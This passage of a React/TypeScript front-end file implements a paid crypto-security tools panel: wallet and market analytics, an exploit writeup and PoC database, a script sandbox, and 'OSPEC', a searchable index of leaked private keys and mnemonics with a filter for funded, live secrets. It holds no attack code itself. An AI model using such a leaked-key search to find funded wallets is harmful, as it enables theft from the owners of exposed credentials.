import { useState, useEffect, useRef } from "react";
import { useTranslation } from "react-i18next";
import {
  Users,
  ArrowLeftRight,
  TrendingUp,
  ShieldCheck,
  GitCompare,
  Loader2,
  Lock,
  Search,
  AlertTriangle,
  Globe,
  Compass,
  KeyRound,
  History,
  Eye,
  Copy,
  Check,
  Flame,
  Layers,
  Radar,
  Zap,
  Terminal,
  UserCheck,
  BookOpen,
} from "lucide-react";
import {
  getSavedUser,
  authHeaders,
  apiGetToolHistory,
  apiGetToolHistoryItem,
  apiGetOspecFindingDetail,
  apiGetHackWriteup,
  type BorisUser,
  type BorisToolHistoryItem,
} from "@/lib/auth";

const API_BASE = "https://api.black-oracle.com";

type ToolId =
  | "holders"
  | "funds"
  | "market"
  | "social"
  | "soroban"
  | "ospec"
  | "zk"
  | "drift"
  | "hacks"
  | "proxy"
  | "surface"
  | "flash"
  | "deployer"
  | "sandbox";

const TIER_RANK: Record<string, number> = { GUEST: 0, RADAR: 1, RAW: 2, BLACKBOX: 3 };

const ToolsPanel = () => {
  const { i18n } = useTranslation();
  const isRu = i18n.language === "ru";
  const user = getSavedUser() as BorisUser | null;
  const tier = (user?.tier || "GUEST").toUpperCase();
  const rank = TIER_RANK[tier] ?? 0;

  const [tool, setTool] = useState<ToolId>("holders");
  const [input1, setInput1] = useState("");
  const [input2, setInput2] = useState("");
  const [chain, setChain] = useState("ethereum");
  const [fundsMode, setFundsMode] = useState<"auto" | "address" | "pool" | "multichain">("auto");
  const [fundsDays, setFundsDays] = useState<number>(14);
  const [marketMode, setMarketMode] = useState<"single" | "trending">("single");
  const [trendingCount, setTrendingCount] = useState<number>(10);
  const [selectedTrendingDossier, setSelectedTrendingDossier] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<any>(null);

  const [historyItems, setHistoryItems] = useState<BorisToolHistoryItem[]>([]);
  const [historyFilter, setHistoryFilter] = useState<string>("all");
  const [loadingHistoryId, setLoadingHistoryId] = useState<number | null>(null);

  // OSPEC Telegram-style filter states
  const [ospecSeverity, setOspecSeverity] = useState<string>("");
  const [ospecVertical, setOspecVertical] = useState<string>("ALL");
  const [ospecCategory, setOspecCategory] = useState<string>("ALL");
  const [ospecClsFilter, setOspecClsFilter] = useState<string>("REAL");
  const [ospecOnlyReal, setOspecOnlyReal] = useState<boolean>(true);
  const [ospecOnlyLive, setOspecOnlyLive] = useState<boolean>(false);
  const [ospecOffset, setOspecOffset] = useState<number>(0);
  const [expandedFindingId, setExpandedFindingId] = useState<number | null>(null);
  const [findingDetail, setFindingDetail] = useState<Record<number, any>>({});
  const [loadingFindingId, setLoadingFindingId] = useState<number | null>(null);
  const [copiedSecretId, setCopiedSecretId] = useState<string | null>(null);
  const [openedHistoryBanner, setOpenedHistoryBanner] = useState<string | null>(null);
  const [ospecDaemonRunning, setOspecDaemonRunning] = useState<boolean>(true);
  const [ospecDaemonBusy, setOspecDaemonBusy] = useState<boolean>(false);
  const [ospecDaemonMsg, setOspecDaemonMsg] = useState<string | null>(null);
  const [zkShowcaseTab, setZkShowcaseTab] = useState<"active_tvl" | "benchmarks">("active_tvl");
  const [zkActiveContracts, setZkActiveContracts] = useState<any[]>([]);
  const [zkActiveLoading, setZkActiveLoading] = useState<boolean>(false);
  const ospecSearchInputRef = useRef<HTMLInputElement | null>(null);

  // Full Markdown Writeup viewer for the 1,678 Deep Exploits DB
  const [expandedWriteupSlug, setExpandedWriteupSlug] = useState<string | null>(null);
  const [writeupCache, setWriteupCache] = useState<Record<string, any>>({});
  const [loadingWriteupSlug, setLoadingWriteupSlug] = useState<string | null>(null);

  const handleToggleWriteup = async (slug: string, title?: string) => {
    const key = slug || title || "";
    if (!key) return;
    if (expandedWriteupSlug === key && writeupCache[key]) {
      setExpandedWriteupSlug(null);
      return;
    }
    setExpandedWriteupSlug(key);
    if (writeupCache[key]) return;
    setLoadingWriteupSlug(key);
    try {
      const data = await apiGetHackWriteup(slug, title);
      setWriteupCache((prev) => ({ ...prev, [key]: data }));
    } catch (e: any) {
      setWriteupCache((prev) => ({ ...prev, [key]: { error: e.message } }));
    } finally {
      setLoadingWriteupSlug(null);
    }
  };

  const skipAutoOspecRef = useRef<boolean>(false);
  const resultsTopRef = useRef<HTMLDivElement | null>(null);
  const activeToolResultRef = useRef<HTMLDivElement | null>(null);

  const handleToggleOspecFinding = async (fid: number) => {
    if (expandedFindingId === fid) {
      setExpandedFindingId(null);
      return;
    }
    setExpandedFindingId(fid);
    if (findingDetail[fid]) return;
    setLoadingFindingId(fid);
    try {
      const detail = await apiGetOspecFindingDetail(fid);
      setFindingDetail((prev) => ({ ...prev, [fid]: detail }));
    } catch {
      // ignore
    } finally {
      setLoadingFindingId(null);
    }
  };

  const loadHistory = (filter?: string) => {
    const f = filter ?? historyFilter;
    apiGetToolHistory(f === "all" ? undefined : f).then(setHistoryItems);
  };

  useEffect(() => {
    loadHistory(historyFilter);
  }, [historyFilter]);

  const runOspecWithFilters = async (opts?: {
    q?: string;
    sev?: string;
    vert?: string;
    cat?: string;
    cls?: string;
    real?: boolean;
    live?: boolean;
    offset?: number;
  }) => {
    if (rank < 1) return;
    const qVal = opts?.q !== undefined ? opts.q : input1.trim();
    const sevVal = opts?.sev !== undefined ? opts.sev : ospecSeverity;
    const vertVal = opts?.vert !== undefined ? opts.vert : ospecVertical;
    const catVal = opts?.cat !== undefined ? opts.cat : ospecCategory;
    const clsVal = opts?.cls !== undefined ? opts.cls : ospecClsFilter;
    const realVal = opts?.real !== undefined ? opts.real : ospecOnlyReal;
    const liveVal = opts?.live !== undefined ? opts.live : ospecOnlyLive;
    const offsetVal = opts?.offset !== undefined ? opts.offset : 0;
    setOspecOffset(offsetVal);

    setError(null);
    setOpenedHistoryBanner(null);
    setLoading(true);
    try {
      const res = await fetch(`${API_BASE}/api/tools/ospec`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify({
          query: qVal,
          severity: sevVal,
          vertical: vertVal,
          category: catVal,
          cls_filter: clsVal,
          only_real: realVal,
          only_live: liveVal,
          offset: offsetVal,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
      if (typeof data?.db_stats?.ospec_watcher_running === "boolean") {
        setOspecDaemonRunning(data.db_stats.ospec_watcher_running);
      }
      setResult(data);
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "OSPEC error");
    } finally {
      setLoading(false);
    }
  };

  // Keyboard hotkeys for OSPEC when active and not typing in an input/select
  useEffect(() => {
    if (tool !== "ospec" || rank < 1) return;
    const onKeyDown = (ev: KeyboardEvent) => {
      const tag = (ev.target as HTMLElement)?.tagName?.toLowerCase();
      if (tag === "input" || tag === "textarea" || tag === "select") {
        if (ev.key === "Escape") (ev.target as HTMLElement).blur();
        return;
      }
      if (ev.ctrlKey || ev.metaKey || ev.altKey) return;
      if (ev.key === "/") {
        ev.preventDefault();
        ospecSearchInputRef.current?.focus();
      } else if (ev.key === "1") {
        ev.preventDefault();
        setInput1("");
        setOspecSeverity("");
        setOspecCategory("ALL");
        setOspecClsFilter("REAL");
        setOspecOnlyReal(true);
        setOspecOnlyLive(false);
        runOspecWithFilters({ q: "", sev: "", cat: "ALL", cls: "REAL", real: true, live: false, offset: 0 });
      } else if (ev.key === "2") {
        ev.preventDefault();
        if (rank < 2) {
          setError(isRu ? "🔥 Фильтр LIVE / С балансом доступен на тарифах RAW и BLACKBOX." : "🔥 LIVE / Funded filter requires RAW or BLACKBOX tier.");
          return;
        }
        const next = !ospecOnlyLive;
        setOspecOnlyLive(next);
        runOspecWithFilters({ live: next, offset: 0 });
      } else if (ev.key === "3") {
        ev.preventDefault();
        const next = ospecSeverity === "CRITICAL" ? "" : "CRITICAL";
        setOspecSeverity(next);
        runOspecWithFilters({ sev: next, offset: 0 });
      } else if (ev.key === "4") {
        ev.preventDefault();
        const next = ospecSeverity === "HIGH" ? "" : "HIGH";
        setOspecSeverity(next);
        runOspecWithFilters({ sev: next, offset: 0 });
      } else if (ev.key === "5") {
        ev.preventDefault();
        if (rank < 2) {
          setError(isRu ? "🍔 Категория Whitehat (Рестораны / POS / SaaS) доступна на тарифах RAW и BLACKBOX." : "🍔 Whitehat category requires RAW or BLACKBOX tier.");
          return;
        }
        const next = ospecCategory === "WHITEHAT_POS_BIZ" ? "ALL" : "WHITEHAT_POS_BIZ";
        setOspecCategory(next);
        runOspecWithFilters({ cat: next, offset: 0 });
      } else if (ev.key === "6") {
        ev.preventDefault();
        if (rank < 3) {
          setError(isRu ? "🧪 Обратный отсев (пулы SUSPECT / TEST) доступен эксклюзивно на тарифе BLACKBOX." : "🧪 Reverse-Sieve (SUSPECT / TEST pools) requires BLACKBOX tier.");
          return;
        }
        const nextCls = ospecClsFilter === "REAL" ? "SUSPECT" : "REAL";
        const nextReal = nextCls === "REAL";
        setOspecClsFilter(nextCls);
        setOspecOnlyReal(nextReal);
        runOspecWithFilters({ cls: nextCls, real: nextReal, offset: 0 });
      } else if (ev.key === "[" || ev.key === "ArrowLeft") {
        const step = Number(result?.limit || 15);
        if (ospecOffset > 0 && !loading) {
          ev.preventDefault();
          runOspecWithFilters({ offset: Math.max(0, ospecOffset - step) });
        }
      } else if (ev.key === "]" || ev.key === "ArrowRight") {
        const step = Number(result?.limit || 15);
        const tot = Number(result?.total_groups || 0);
        if (ospecOffset + step < tot && !loading) {
          ev.preventDefault();
          runOspecWithFilters({ offset: ospecOffset + step });
        }
      }
    };
    window.addEventListener("keydown", onKeyDown);
    return () => window.removeEventListener("keydown", onKeyDown);
  }, [tool, rank, ospecOnlyLive, ospecSeverity, ospecCategory, ospecClsFilter, ospecOffset, result, loading]);

  useEffect(() => {
    const pendingRepo = sessionStorage.getItem("boris_pending_ospec_repo");
    if (pendingRepo && rank >= 1) {
      sessionStorage.removeItem("boris_pending_ospec_repo");
      skipAutoOspecRef.current = true;
      setTool("ospec");
      setInput1(pendingRepo);
      setOspecSeverity("");
      setOspecOnlyReal(true);
      setOspecOnlyLive(false);
      runOspecWithFilters({ q: pendingRepo, sev: "", real: true, live: false, offset: 0 });
    }
    const onOpenOspecEvent = (ev: Event) => {
      const ce = ev as CustomEvent<{ repo?: string }>;
      const targetRepo = ce?.detail?.repo || sessionStorage.getItem("boris_pending_ospec_repo") || "";
      if (targetRepo && rank >= 1) {
        sessionStorage.removeItem("boris_pending_ospec_repo");
        skipAutoOspecRef.current = true;
        setTool("ospec");
        setInput1(targetRepo);
        setOspecSeverity("");
        setOspecOnlyReal(true);
        setOspecOnlyLive(false);
        runOspecWithFilters({ q: targetRepo, sev: "", real: true, live: false, offset: 0 });
      }
    };
    window.addEventListener("boris-open-ospec-repo", onOpenOspecEvent);

    const runZkDirect = async (addr: string, ch: string) => {
      setTool("zk");
      setInput1(addr);
      setChain(ch);
      setError(null);
      setLoading(true);
      try {
        const res = await fetch(`${API_BASE}/api/tools/zk-audit`, {
          method: "POST",
          headers: { "Content-Type": "application/json", ...authHeaders() },
          body: JSON.stringify({ address: addr, chain: ch }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
        setResult(data);
        loadHistory("zk");
      } catch (e: any) {
        setError(e.message || "ZK Audit error");
      } finally {
        setLoading(false);
      }
    };

    const pendingZkRaw = sessionStorage.getItem("boris_pending_zk_target");
    if (pendingZkRaw && rank >= 2) {
      sessionStorage.removeItem("boris_pending_zk_target");
      try {
        const parsed = JSON.parse(pendingZkRaw);
        if (parsed?.address) {
          runZkDirect(parsed.address, parsed.chain || "ethereum");
        }
      } catch {}
    }

    const onOpenZkEvent = (ev: Event) => {
      const ce = ev as CustomEvent<{ address?: string; chain?: string }>;
      const addr = ce?.detail?.address || "";
      const ch = ce?.detail?.chain || "ethereum";
      if (addr && rank >= 2) {
        sessionStorage.removeItem("boris_pending_zk_target");
        runZkDirect(addr, ch);
      }
    };
    window.addEventListener("boris-open-zk-audit", onOpenZkEvent);

    return () => {
      window.removeEventListener("boris-open-ospec-repo", onOpenOspecEvent);
      window.removeEventListener("boris-open-zk-audit", onOpenZkEvent);
    };
  }, [rank]);

  useEffect(() => {
    if (skipAutoOspecRef.current) {
      skipAutoOspecRef.current = false;
      return;
    }
    if (tool === "ospec" && rank >= 1 && !result) {
      runOspecWithFilters({ q: "", sev: "", real: true, live: false, offset: 0 });
    }
    if (tool === "zk" && rank >= 2 && zkActiveContracts.length === 0) {
      setZkActiveLoading(true);
      fetch(`${API_BASE}/api/tools/zk-active-valuable`, { headers: { ...authHeaders() } })
        .then((r) => r.json())
        .then((d) => {
          if (Array.isArray(d?.items)) setZkActiveContracts(d.items);
        })
        .catch(() => {})
        .finally(() => setZkActiveLoading(false));
    }
  }, [tool]);

  const TOOLS: Array<{
    id: ToolId;
    labelRu: string;
    labelEn: string;
    icon: any;
    minRank: number;
    placeholder: string;
  }> = [
    { id: "holders", labelRu: "Холдеры и киты", labelEn: "Holders & Whales", icon: Users, minRank: 0, placeholder: "0xA0b86991...B48" },
    { id: "market", labelRu: "Рынок и деривативы", labelEn: "Market & Derivatives", icon: TrendingUp, minRank: 0, placeholder: "BTC / ETH / SOL / PEPE" },
    { id: "funds", labelRu: "Потоки средств 14д", labelEn: "Funds Flow 14d", icon: ArrowLeftRight, minRank: 1, placeholder: "0xA0b86991...B48" },
    { id: "social", labelRu: "Social & OSINT", labelEn: "Social & OSINT", icon: Globe, minRank: 0, placeholder: "@handle, org/repo, t.me/..., x.com/..." },
    { id: "soroban", labelRu: "Soroban / Stellar", labelEn: "Soroban / Stellar", icon: Compass, minRank: 0, placeholder: "USDC, AQUA, CODE:ISSUER, C..." },
    { id: "ospec", labelRu: "OSPEC (Утечки 1.1M)", labelEn: "OSPEC (1.1M Secrets)", icon: KeyRound, minRank: 1, placeholder: "Фильтр по типу секрета или org/repo (пусто = последние находки)" },
    { id: "hacks", labelRu: "База 2,539 взломов (1,678 разборов + PoC)", labelEn: "2,539 Exploits DB (1,678 Writeups + PoC)", icon: Flame, minRank: 1, placeholder: "0x... контракт ИЛИ поиск по 1,678 разборам: uranium, euler, curve, slot0, reentrancy" },
    { id: "deployer", labelRu: "Деплоер & Профайлер Адреса", labelEn: "Deployer & Address Profiler", icon: UserCheck, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (1 или несколько 0x-адресов)" },
    { id: "proxy", labelRu: "Proxy & EIP-1967 Инспектор", labelEn: "Proxy & EIP-1967 Inspector", icon: Layers, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    { id: "flash", labelRu: "Flash-Loan & Spot-Оракул", labelEn: "Flash-Loan & Spot Oracle", icon: Zap, minRank: 1, placeholder: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2" },
    { id: "surface", labelRu: "Web3 Surface Mapper (Домен)", labelEn: "Web3 Surface Mapper (Domain)", icon: Radar, minRank: 1, placeholder: "across.to / rhino.fi / app.aave.com" },
    { id: "drift", labelRu: "Audit Drift (Репозиторий)", labelEn: "Audit Drift (Repo Audits)", icon: GitCompare, minRank: 1, placeholder: "https://github.com/aave/aave-v3-core или org/repo" },
    { id: "zk", labelRu: "ZK Math Monster v5.0 (7 Систем)", labelEn: "ZK Math Monster v5.0 (7 Systems)", icon: ShieldCheck, minRank: 2, placeholder: "0x... адрес ZK-верификатора (Groth16 / PLONK / FFLONK / Halo2 / Honk / STARK / zkVM)" },
    { id: "sandbox", labelRu: "Matrix Sandbox v16.2", labelEn: "Matrix Sandbox v16.2", icon: Terminal, minRank: 2, placeholder: "import requests, subprocess..." },
  ];

  const validateToolInput = (tId: ToolId, rawVal: string): string | null => {
    const val = (rawVal || "").trim();
    const hasCyrillic = /[А-Яа-яЁё]/.test(val);
    const hasMash = /(asdf|qwerty|zxcv|йцук|фыва|ячсм|1234567)/i.test(val) || /(.)\1{6,}/i.test(val);
    const isEvm = /^0x[a-fA-F0-9]{40}$/.test(val);
    const isGarbageEvm =
      isEvm &&
      (/^0x0{40}$/i.test(val) ||
        /^0xf{40}$/i.test(val) ||
        val.slice(2, 6) === "0000" ||
        val.slice(10, 34) === "0".repeat(24) ||
        new Set(val.slice(2).toLowerCase().split("")).size <= 3);

    if (tId !== "sandbox" && (val.includes("\n") || val.includes("\r") || val.length > 160)) {
      return isRu
        ? "Защита от каши: обнаружена многострочная вставка или слишком длинный текст. Введите точный идентификатор."
        : "Invalid multi-line or oversized input pasted. Enter a valid target identifier.";
    }
    if (hasMash) {
      return isRu
        ? "Защита от каши: обнаружена случайная комбинация символов. Введите реальный адрес, тикер или репозиторий."
        : "Garbage input detected. Please enter a real contract address, ticker, or repository.";
    }

    if (tId === "holders" || tId === "funds" || tId === "proxy" || tId === "flash" || tId === "zk") {
      if (!isEvm) {
        return isRu
          ? "Для этого инструмента требуется валидный EVM-адрес смарт-контракта (42 символа: 0x + 40 hex-символов без пробелов)."
          : "This tool requires a valid 42-character 0x EVM contract address.";
      }
      if (isGarbageEvm) {
        return isRu
          ? "Указанный 0x-адрес является нулевым, тестовым плейсхолдером или обрезком ABI."
          : "The provided 0x address is a zero address, test placeholder, or ABI selector fragment.";
      }
      return null;
    }

    if (tId === "deployer") {
      if (!val || hasCyrillic) {
        return isRu
          ? "Укажите один или несколько 42-символьных 0x-адресов через пробел или запятую."
          : "Enter one or more 42-character 0x addresses separated by comma or space.";
      }
      const parts = val.split(/[\s,;]+/).filter(Boolean);
      for (const p of parts) {
        if (!/^0x[a-fA-F0-9]{40}$/.test(p)) {
          return isRu
            ? `Некорректный фрагмент '${p.slice(0, 20)}': в Профайлер Адреса можно вставлять только 42-символьные 0x-адреса.`
            : `Invalid token '${p.slice(0, 20)}': only 42-character 0x addresses are allowed.`;
        }
      }
      return null;
    }

    if (tId === "market") {
      if (marketMode === "trending") return null;
      const cleanSym = val.replace(/^\$/, "");
      if (!cleanSym || hasCyrillic || /\s/.test(cleanSym)) {
        return isRu
          ? "Введите тикер монеты латиницей без пробелов (например BTC, ETH, DOGE, SOL, AAVE)."
          : "Enter an alphanumeric coin ticker without spaces (e.g. BTC, ETH, DOGE, SOL, AAVE).";
      }
      if (cleanSym.toLowerCase().startsWith("0x") && cleanSym.length >= 20) {
        return isRu
          ? "Вы вставили 0x-адрес вместо тикера монеты. Введите короткий биржевой тикер (например AAVE, USDT, DOGE)."
          : "You pasted a 0x address instead of a coin ticker. Enter a ticker symbol (e.g. AAVE, USDT, DOGE).";
      }
      if (!/^[A-Za-z0-9]{2,12}$/.test(cleanSym)) {
        return isRu
          ? `Недопустимый формат тикера '${cleanSym.slice(0, 16)}': используйте от 2 до 12 латинских букв/цифр.`
          : `Invalid ticker format '${cleanSym.slice(0, 16)}': use 2–12 alphanumeric characters.`;
      }
      return null;
    }

    if (tId === "surface") {
      if (!val || hasCyrillic || /\s/.test(val)) {
        return isRu
          ? "Укажите веб-домен протокола без пробелов (например aave.com, dexe.network, across.to)."
          : "Enter a protocol domain without spaces (e.g. aave.com, dexe.network, across.to).";
      }
      if (val.toLowerCase().startsWith("0x")) {
        return isRu
          ? "Вы вставили 0x-адрес вместо веб-домена. Для Web3 Surface Mapper нужен домен сайта (например aave.com)."
          : "You pasted a 0x address instead of a domain. Enter a website domain (e.g. aave.com).";
      }
      if (val.toLowerCase().includes("github.com/") || (!val.startsWith("http") && val.includes("/"))) {
        return isRu
          ? "Вы вставили ссылку на GitHub-репозиторий вместо веб-домена протокола. Укажите домен сайта (например aave.com)."
          : "You pasted a repository path instead of a website domain. Enter a domain (e.g. aave.com).";
      }
      if (!/^(https?:\/\/)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,24}(\/.*)?$/.test(val)) {
        return isRu
          ? "Некорректный формат домена. Пример: aave.com или https://app.aave.com"
          : "Invalid domain format. Example: aave.com or https://app.aave.com";
      }
      return null;
    }

    if (tId === "drift") {
      if (!val || hasCyrillic || /\s/.test(val) || !/^(https?:\/\/(www\.)?github\.com\/)?[A-Za-z0-9_.-]{2,50}\/[A-Za-z0-9_.-]{2,80}(\.git)?\/?$/.test(val)) {
        return isRu
          ? "Укажите ссылку на GitHub-репозиторий или org/repo (например aave/aave-v3-core)."
          : "Enter a valid GitHub repository URL or org/repo (e.g. aave/aave-v3-core).";
      }
      return null;
    }

    if (tId === "soroban") {
      if (!val || hasCyrillic || /\s/.test(val) || val.toLowerCase().startsWith("0x")) {
        return isRu
          ? "Укажите ассет Stellar (USDC, AQUA, CODE:ISSUER) или 56-символьный контракт Soroban (C...)."
          : "Enter a Stellar asset (USDC, AQUA, CODE:ISSUER) or a 56-char Soroban C... contract.";
      }
      if (!(/^[GC][A-Z2-7]{55}$/.test(val) || /^[A-Za-z0-9]{1,12}:G[A-Z2-7]{55}$/.test(val) || /^[A-Za-z0-9]{2,12}$/.test(val))) {
        return isRu
          ? "Недопустимый формат Stellar/Soroban цели. Используйте тикер (USDC), CODE:ISSUER или адрес G.../C... (56 символов)."
          : "Invalid Stellar/Soroban format.";
      }
      return null;
    }

    if (tId === "social") {
      if (!val || hasCyrillic || val.split(/\s+/).length > 3) {
        return isRu
          ? "Введите @handle, название проекта латиницей (до 3 слов) или ссылку на X / Telegram / GitHub."
          : "Enter @handle, project name (up to 3 words), or an X / Telegram / GitHub URL.";
      }
      return null;
    }

    if (tId === "ospec") {
      if (val && (hasCyrillic || val.split(/\s+/).length > 3)) {
        return isRu
          ? "В фильтре OSPEC укажите тип секрета (private_key, mnemonic, aws, alchemy) или org/repo латиницей."
          : "Enter a secret kind (private_key, mnemonic, aws, alchemy) or org/repo.";
      }
      return null;
    }

    if (tId === "hacks") {
      if (val && (hasCyrillic || val.split(/\s+/).length > 4 || (val.startsWith("0x") && !isEvm))) {
        return isRu
          ? "Введите валидный 0x-адрес контракта (42 символа) ИЛИ поисковый запрос латиницей (например euler, curve, slot0)."
          : "Enter a valid 42-char 0x address OR a search keyword (e.g. euler, curve, slot0).";
      }
      return null;
    }

    if (tId === "sandbox") {
      if (!val || val.length < 5 || (!val.includes("(") && !val.includes("=") && !val.includes("import "))) {
        return isRu
          ? "Вставьте реальный Python / Web3 код или PoC-скрипт (произвольный текст без инструкций Python отклонён)."
          : "Paste valid Python / Web3 script code (plain text without Python statements is rejected).";
      }
      return null;
    }

    return null;
  };

  const runTrendingScan = async (cntOverride?: number) => {
    const cnt = cntOverride ?? trendingCount;
    setError(null);
    setResult(null);
    setSelectedTrendingDossier(null);
    setLoading(true);
    try {
      const res = await fetch(`${API_BASE}/api/tools/market/trending`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify({ count: cnt }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
      setResult(data);
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "Trending Scanner error");
    } finally {
      setLoading(false);
    }
  };

  const run = async () => {
    const valErr = validateToolInput(tool, input1);
    if (valErr) {
      setError(valErr);
      return;
    }
    if (tool === "ospec") {
      await runOspecWithFilters();
      return;
    }
    if (tool === "market" && marketMode === "trending") {
      await runTrendingScan(trendingCount);
      return;
    }
    setSelectedTrendingDossier(null);
    setError(null);
    setResult(null);
    setLoading(true);
    try {
      let path = "";
      let body: any = {};
      if (tool === "holders") {
        path = "/api/tools/holders";
        body = { address: input1.trim(), chain };
      } else if (tool === "funds") {
        path = "/api/tools/funds-flow";
        body = { address: input1.trim(), chain, days: fundsDays, mode: fundsMode };
      } else if (tool === "market") {
        path = "/api/tools/market";
        body = { symbol: input1.trim().toUpperCase() };
      } else if (tool === "social") {
        path = "/api/tools/social";
        body = { target: input1.trim() };
      } else if (tool === "soroban") {
        path = "/api/tools/soroban";
        body = { target: input1.trim() };
      } else if (tool === "zk") {
        path = "/api/tools/zk-audit";
        body = { address: input1.trim(), chain };
      } else if (tool === "hacks") {
        path = "/api/tools/hack-matcher";
        body = { address: input1.trim(), chain };
      } else if (tool === "proxy") {
        path = "/api/tools/proxy-check";
        body = { address: input1.trim(), chain };
      } else if (tool === "surface") {
        path = "/api/tools/surface-map";
        body = { domain: input1.trim() };
      } else if (tool === "flash") {
        path = "/api/tools/flash-spot";
        body = { address: input1.trim(), chain };
      } else if (tool === "deployer") {
        path = "/api/tools/address-profile";
        body = { address: input1.trim(), chain };
      } else if (tool === "sandbox") {
        path = "/api/tools/sandbox";
        body = { code: input1 };
      } else {
        path = "/api/tools/drift-compare";
        body = { repo_url: input1.trim() };
      }

      const res = await fetch(`${API_BASE}${path}`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify(body),
      });
      if (res.status === 403) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.detail || (isRu ? "Этот инструмент недоступен на вашем тарифе." : "This tool is not available on your tier."));
      }
      if (res.status === 401) {
        throw new Error(isRu ? "Требуется вход в личный кабинет." : "Sign in required.");
      }
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.detail || `HTTP ${res.status}`);
      }
      setResult(await res.json());
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "Error");
    } finally {
      setLoading(false);
    }
  };

  const handleOpenHistoryItem = async (item: BorisToolHistoryItem) => {
    setLoadingHistoryId(item.id);
    setError(null);
    try {
      const data = await apiGetToolHistoryItem(item.id);
      if (data && data.result) {
        skipAutoOspecRef.current = true;
        const r = data.result;
        const rawTarget = String(item.target || "").trim();
        const isFilterTarget = rawTarget.toLowerCase().startsWith("filter:");
        const filterSuffix = isFilterTarget ? rawTarget.slice(7).trim().toUpperCase() : "";

        // Normalize legacy OSPEC history records if needed
        if (item.tool === "ospec") {
          if (Array.isArray(r.findings)) {
            r.findings = r.findings.map((f: any) => ({
              ...f,
              hits: f.hits || 1,
              kind: String(f.kind || "SECRET").replace("secret:", ""),
              gh_url: f.gh_url || f.repo_url || "",
            }));
          }
          if (!r.filter_mode) r.filter_mode = `history:${rawTarget}`;

          const savedCat =
            r.category_filter ||
            (["WHITEHAT_POS_BIZ", "FINTECH_ECOMM", "AI_VOICE_LLM", "CLOUD_DB_BAAS", "COMMS_MOBILE_OTA", "WEB3_WALLETS_RPC"].includes(filterSuffix)
              ? filterSuffix
              : "ALL");
          const savedSev =
            r.severity_filter && r.severity_filter !== "ALL"
              ? r.severity_filter
              : ["CRITICAL", "HIGH", "MEDIUM"].includes(filterSuffix)
              ? filterSuffix
              : "";
          const savedVert = r.vertical_filter || "ALL";
          const savedCls = r.cls_filter || "REAL";
          const cleanQuery = isFilterTarget ? "" : rawTarget;

          setTool("ospec");
          setInput1(cleanQuery);
          setOspecCategory(savedCat);
          setOspecSeverity(savedSev);
          setOspecVertical(savedVert);
          setOspecClsFilter(savedCls);
          setOspecOnlyReal(savedCls === "REAL");
          setOspecOnlyLive(false);

          // If the historical snapshot had 0 findings (e.g. recorded while LIVE filter was stuck on),
          // re-fetch live OSPEC findings immediately so clicking "Открыть" always shows real data!
          if (!Array.isArray(r.findings) || r.findings.length === 0) {
            setOpenedHistoryBanner(
              `${item.tool.toUpperCase()} · ${rawTarget} (${new Date(item.created_at * 1000).toLocaleString()})`
            );
            await runOspecWithFilters({
              q: cleanQuery,
              cat: savedCat,
              sev: savedSev,
              vert: savedVert,
              cls: savedCls,
              real: savedCls === "REAL",
              live: false,
              offset: 0,
            });
            setTimeout(() => {
              (activeToolResultRef.current || resultsTopRef.current)?.scrollIntoView({ behavior: "smooth", block: "start" });
            }, 80);
            return;
          }
        } else {
          const itemChain = String(item.chain || r.chain || "ethereum").toLowerCase();
          setTool(item.tool as ToolId);
          setInput1(rawTarget);
          if (["ethereum", "bsc", "polygon", "arbitrum", "optimism", "base"].includes(itemChain)) {
            setChain(itemChain);
          }

          if (item.tool === "zk" && (!r.onchain_liveness || !r.proving_system_profile || !r.math_bytecode_profile)) {
            setResult(r);
            setOpenedHistoryBanner(
              `📂 Открыт и обновлён до v5.5 отчёт из истории: ZK · ${rawTarget} [${itemChain.toUpperCase()}]`
            );
            setTimeout(() => {
              (activeToolResultRef.current || resultsTopRef.current)?.scrollIntoView({ behavior: "smooth", block: "start" });
            }, 50);
            fetch(`${API_BASE}/api/tools/zk-audit`, {
              method: "POST",
              headers: { "Content-Type": "application/json", ...authHeaders() },
              body: JSON.stringify({ address: rawTarget, chain: itemChain }),
            })
              .then((resZk) => (resZk.ok ? resZk.json() : null))
              .then((freshZk) => {
                if (freshZk) setResult(freshZk);
              })
              .catch(() => {});
            return;
          }
        }

        setResult(r);
        setOpenedHistoryBanner(
          `📂 Открыт отчёт из истории: ${item.tool.toUpperCase()} · ${rawTarget} [${(item.chain || "").toUpperCase()}] (${new Date(item.created_at * 1000).toLocaleString()})`
        );
        setTimeout(() => {
          (activeToolResultRef.current || resultsTopRef.current)?.scrollIntoView({ behavior: "smooth", block: "start" });
        }, 80);
      }
    } catch (e: any) {
      setError(e.message || "Failed to load saved tool report");
    } finally {
      setLoadingHistoryId(null);
    }
  };

  const active = TOOLS.find((t) => t.id === tool)!;
  const locked = rank < active.minRank;

  const fmt = (n: any, digits = 2) => {
    const v = Number(n);
    if (!isFinite(v)) return "—";
    if (Math.abs(v) >= 1e9) return (v / 1e9).toFixed(2) + "B";
    if (Math.abs(v) >= 1e6) return (v / 1e6).toFixed(2) + "M";
    if (Math.abs(v) >= 1e3) return (v / 1e3).toFixed(2) + "K";
    return v.toFixed(digits);
  };

  return (
    <div ref={resultsTopRef} className="space-y-5">
      {openedHistoryBanner && (
